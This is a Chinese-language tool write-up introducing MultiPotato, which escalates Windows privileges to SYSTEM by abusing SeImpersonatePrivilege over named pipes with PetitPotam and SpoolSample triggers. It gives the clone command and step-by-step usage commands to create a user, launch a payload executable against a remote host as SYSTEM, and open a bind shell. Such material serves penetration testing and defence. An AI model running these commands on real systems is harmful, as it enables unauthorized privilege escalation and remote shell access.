![](https://image.3001.net/images/20220118/1642472751_61e6252ff41d5edcc3b2b.jpeg!small)

## 写在前面的话

在这篇文章中，我们将给大家演示如何通过SeImpersonatePrivilege权限来获取SYSTEM权限，并通过提权来判断自己系统内的SYSTEM权限安全。但需要注意的地方在于：

> 1、本文所涉及到的内容并不包含可以用于Payload武器化的任何SYSTEM认证触发trigger，本文提供的代码可以用于自行开发和整合trigger。
>
>
> 2、本文所使用的技术不仅使用了CreateProcessWithTokenW来生成一个新的进程，而且我们还可以使用CreateProcessWithTokenW、CreateProcessAsUserW、CreateUser和BindShell来实现类似的效果。

## 关于MultiPotato

MultiPotato这个项目能够开启一台命名管道服务器，并模拟任何连接到它的用户，然后执行上面提到的功能选项之一。如果将来发布任何新的系统身份验证触发器，此工具仍然可以用于提升权限，只不过需要使用另一个命名管道名称而已。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/S3cur3Th1sSh1t/MultiPotato.git

## 工具使用

1、使用修改后的PetitPotam触发器来调用工具的CreateUser创建用户：

    
    
    c:\temp\MultiPotato> MultiPotato.exe -t CreateUser

接下来，MultiPotato将会监听命名管道“\\\\.\pipe\pwned/pipe/srvsvc”。此时，我们也可以通过-p选项来调整参数并使用其他的SYSTEM认证触发器：

    
    
    c:\temp\MultiPotato> PetitPotamModified.exe localhost/pipe/pwned localhost

当然了，我们也可以利用有效的低级权限并使用远程系统中的PetitPotam.py来作为触发器。

![](https://image.3001.net/images/20220118/1642472779_61e6254ba6539e594bbea.png!small)

2、使用SpoolSample触发器调用CreateProcessAsUserW：

    
    
    c:\temp\MultiPotato> MultiPotato.exe -t CreateProcessAsUserW -p "pwned\pipe\spoolss" -e "C:\temp\stage2.exe"

使用下列命令触发：

    
    
    c:\temp\MultiPotato>MS-RPRN.exe \\192.168.100.150 \\192.168.100.150/pipe/pwned

![](https://image.3001.net/images/20220118/1642472793_61e625596d5f39be3a96c.png!small)

3、BindShell（SpoolSample管道）:

    
    
    c:\temp\MultiPotato> MultiPotato.exe -t BindShell -p "pwned\pipe\spoolss"

![](https://image.3001.net/images/20220118/1642472810_61e6256af3b033bd02be9.png!small)

![](https://image.3001.net/images/20220118/1642472816_61e625709d4e0c3077806.png!small)

## 项目地址

 **MultiPotato：** 【[
_GitHub传送门_](https://github.com/S3cur3Th1sSh1t/MultiPotato)】

## 参考资料

> [
> _https://github.com/S3cur3Th1sSh1t/MultiPotato/blob/main/Multipotato/common.h_](https://github.com/S3cur3Th1sSh1t/MultiPotato/blob/main/Multipotato/common.h)
>
> [ _https://twitter.com/splinter_code_](https://twitter.com/splinter_code)
>
> [ _https://twitter.com/decoder_it_](https://twitter.com/decoder_it)
>
> [
> _https://github.com/antonioCoco/RoguePotato_](https://github.com/antonioCoco/RoguePotato)

